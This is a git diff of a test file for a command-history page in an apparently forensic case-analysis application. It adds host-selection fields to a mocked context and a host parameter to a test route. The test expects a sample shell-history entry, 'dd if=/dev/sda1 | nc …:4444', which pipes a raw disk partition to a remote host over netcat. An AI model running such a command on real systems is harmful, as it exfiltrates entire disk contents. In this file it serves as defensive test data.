@@ -22,10 +22,14 @@ vi.mock("../context/ActiveCaseContext", () => ({
     activeCaseId: "",
     activeCase: null,
     selectedHost: "HOSTA",
+    selectedHostId: "",
     selectedEvidenceId: "ev-1",
+    caseContext: { hosts: [] },
     setActiveCaseId: vi.fn(),
     setSelectedHost: vi.fn(),
+    setSelectedHostId: vi.fn(),
     setSelectedEvidenceId: vi.fn(),
+    clearSelectedHost: vi.fn(),
   }),
 }));
 
@@ -284,7 +288,7 @@ describe("CommandHistoryPage", () => {
     getCommandHistoryMock.mockResolvedValueOnce(linuxResponse);
     const user = userEvent.setup();
 
-    renderPage("/cases/case-1/command-history?family=linux_shell_history");
+    renderPage("/cases/case-1/command-history?family=linux_shell_history&host=HOSTA");
 
     expect(await screen.findByText("dd if=/dev/sda1 | nc 192.168.56.1 4444")).toBeInTheDocument();
     expect(screen.getAllByText("linux_shell_history").length).toBeGreaterThan(0);
